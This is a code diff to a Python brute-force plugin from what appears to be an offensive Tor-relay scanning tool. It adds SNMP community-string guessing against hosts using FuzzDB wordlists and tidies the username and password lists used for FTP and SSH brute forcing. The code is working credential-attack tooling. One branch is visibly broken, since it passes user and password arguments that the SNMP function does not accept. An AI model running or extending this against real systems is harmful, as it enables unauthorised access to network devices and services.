@@ -22,7 +22,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 
 from core.tortazo.pluginManagement.BasePlugin import BasePlugin
-from stem.version import Version
+from pysnmp.entity.rfc3413.oneliner import cmdgen
 from prettytable import PrettyTable
 import paramiko
 import ftplib
@@ -162,7 +162,6 @@ class bruterPlugin(BasePlugin):
             self.unsetSocksProxy()
 
         print "[+] Bruteforce on service %s " %(host)
-        ftpFileName = 'commandandcontrolftp.txt'
         print "[+] Trying Anonymous access in: %s " %(host)
         if self.anonymousFTPAccess(host,port):
             return
@@ -210,13 +209,33 @@ class bruterPlugin(BasePlugin):
     ################################################################################################################################################
     ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
     ################################################################################################################################################
-    def snmpBruterOnRelay(self, relay, dictFile=None):
+    def snmpBruterOnRelay(self, host, port=161, dictFile=None):
         '''
         TOR only works on TCP, and typically SNMP works on UDP, so teorically you cann't configure an SNMP Service as Hidden Service.
         '''
         self.unsetSocksProxy()
-        if dictFile is None:
-            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
+        if dictFile is not None and os.path.exists(dictFile):
+            print "[+] Reading the Passwords file %s " %(dictFile)
+            for line in open(dictFile, "r").readlines():
+                [user, passwd] = line.strip().split(self.separator)
+                try :
+                    if self.performSNMPConnection(host,port, user=user, passwd=passwd):
+                        break
+                except Exception as excep:
+                    print "[-] Captured exception. Finishing attack."
+                    print sys.exc_info()
+                    return
+        else:
+            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
+            communities = self.getSNMPCommunitiesFromFuzzDB()
+            try :
+                for community in communities:
+                    if self.performSNMPConnection(host,port, community=community):
+                        break
+            except Exception as excep:
+                print "[-] Captured exception. Finishing attack."
+                print sys.exc_info()
+                return
 
     def snmpBruterOnAllRelays(self, relay, port, dictFile=None):
         for relay in self.bruteForceData:
@@ -375,6 +394,21 @@ class bruterPlugin(BasePlugin):
             sshFile.close()
             client.close()
 
+    def performSNMPConnection(self, host, port=161, community='public'):
+        snmpCmdGen = cmdgen.CommandGenerator()
+        print "[+] Trying community name: %s " %(community)
+        snmpTransportData = cmdgen.UdpTransportTarget((host, port))
+        mib = cmdgen.MibVariable('SNMPv2-MIB', 'sysName', 0)
+        error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, mib)
+
+        if error:
+            # Check for errors and print out results
+            return False
+        else:
+            print "[*] SNMP Bruteforce Success ... community name: %s is VALID! " % (community)
+            return True
+
+
     def getUserlistFromFuzzDB(self):
         '''
         Reads:
@@ -395,16 +429,16 @@ class bruterPlugin(BasePlugin):
             print sys.exc_info()
 
         for userNameList in namelist.readlines():
-            users.append(userNameList)
+            users.append(userNameList.rstrip('\n'))
 
         for userJohnList in johnlist.readlines():
-            users.append(userJohnList)
+            users.append(userJohnList.rstrip('\n'))
 
         for userunix in unixusers.readlines():
-            users.append(userunix)
+            users.append(userunix.rstrip('\n'))
 
         for userfaithwriter in faithwriters.readlines():
-            users.append(userfaithwriter)
+            users.append(userfaithwriter.rstrip('\n'))
         return users
 
     def getPasslistFromFuzzDB(self):
@@ -421,17 +455,30 @@ class bruterPlugin(BasePlugin):
         unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
         weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')
         for johnpass in johnlist.readlines():
-            passwords.append(johnpass)
+            passwords.append(johnpass.rstrip('\n'))
 
         for unixpass in unixpasswords.readlines():
-            passwords.append(unixpass)
+            passwords.append(unixpass.rstrip('\n'))
 
-        for wealsauce in weaksauce.readlines():
-            passwords.append(wealsauce)
+        for sauce in weaksauce.readlines():
+            passwords.append(sauce.rstrip('\n'))
 
         return passwords
-    
-        
+
+    def getSNMPCommunitiesFromFuzzDB(self):
+        '''
+        Reads:
+        fuzzdb/wordlists-misc/wordlist-common-snmp-community-strings.txt
+        '''
+        print "[+] Reading the wordlist with common SNMP communities from FuzzDB"
+        communities = []
+        commonCommunities = open('fuzzdb/wordlists-misc/wordlist-common-snmp-community-strings.txt', 'r')
+        for community in commonCommunities.readlines():
+            print community
+            communities.append(community.rstrip('\n'))
+        return  communities
+
+
     def help(self):
         print "[*] Functions availaible available in the Plugin..."
         tableHelp = PrettyTable(["Function", "Description", "Example"])
